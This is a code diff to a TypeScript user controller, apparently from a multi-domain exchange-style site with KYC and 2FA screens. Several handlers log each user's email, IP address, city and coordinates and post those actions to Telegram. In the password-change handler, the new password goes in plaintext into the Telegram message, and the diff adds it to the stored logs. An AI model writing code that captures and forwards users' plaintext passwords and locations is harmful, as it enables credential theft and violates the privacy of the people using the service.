@@ -26,7 +26,7 @@ class UserController {
       const user: any = await UserServices.dashboard(id)
       console.log('found user is: ', user)
 
-      await saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, 'dashboard', domainName)
+      await saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, 'перешел на dashboard', domainName)
       await telegram.sendMessageByUserActions(email, ' перешел на dashboard ', domainName)
 
       return res.json(user)
@@ -45,7 +45,7 @@ class UserController {
       const user: any = await UserServices.personalAreaProfile(id)
       console.log('found user is: ', user)
       if (user) {
-        await saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName)
+        await saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, `перешел на ${userAction} на`, domainName)
         await telegram.sendMessageByUserActions(email, ` перешел на ${userAction}`, domainName)
         return res.json({
           user: user,
@@ -64,7 +64,7 @@ class UserController {
 
   async personalAreaProfileEdit(req: express.Request, res: express.Response, next: express.NextFunction) {
     try {
-      const { userId, userName, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction, } = req.body
+      const { userId, userName, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
       console.log('req body: ', req.body);
 
       if (!userName && !userId) {
@@ -80,7 +80,7 @@ class UserController {
           status: 'rejected'
         })
       }
-      await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName)
+      await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял имя на ${userName} на `, domainName)
       await telegram.sendMessageByUserActions(userEmail, `поменял имя на ${userName} `, domainName)
       return res.json({
         message: 'name was changed',
@@ -103,7 +103,7 @@ class UserController {
   async personalAreaSecurityChangePassword(req: express.Request, res: express.Response, next: express.NextFunction) {
     try {
       // get accoutn security (2fa, login history)
-      const { id, newPassword, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction, } = req.body
+      const { id, newPassword, userEmail, domainName, ipAddress, city, countryName, coordinates, currentDate, userAction } = req.body
       const result: any = await UserServices.personalAreaChangePassword(userEmail, newPassword)
       if (result === false) {
         console.log('operation status: ', result)
@@ -112,7 +112,7 @@ class UserController {
           status: 'rejected'
         })
       }
-      await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName)
+      await saveUserLogs(id, userEmail, ipAddress, city, countryName, coordinates, currentDate, `поменял пароль на  ${newPassword} на `, domainName)
       await telegram.sendMessageByUserActions(userEmail, `поменял пароль на  ${newPassword}`, domainName)
       console.log('operation status: ', result)
       return res.json({
@@ -140,7 +140,7 @@ class UserController {
         })
       }
 
-      await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName)
+      await saveUserLogs(userId, userEmail, ipAddress, city, countryName, coordinates, currentDate, `выключил 2фа аутентификацию на`, domainName)
       await telegram.sendMessageByUserActions(userEmail, `выключил 2фа аутентификацию `, domainName)
       return res.json({
         message: '2fa turned off',
@@ -190,7 +190,7 @@ class UserController {
           stasus: 'rejected'
         })
       }
-      await saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, userAction, domainName)
+      await saveUserLogs(id, email, ipAddress, city, countryName, coordinates, currentDate, ' отправил KYC', domainName)
       await telegram.sendMessageByUserActions(email, ' отправил KYC', domainName)
       return res.json({
         kyc: true,
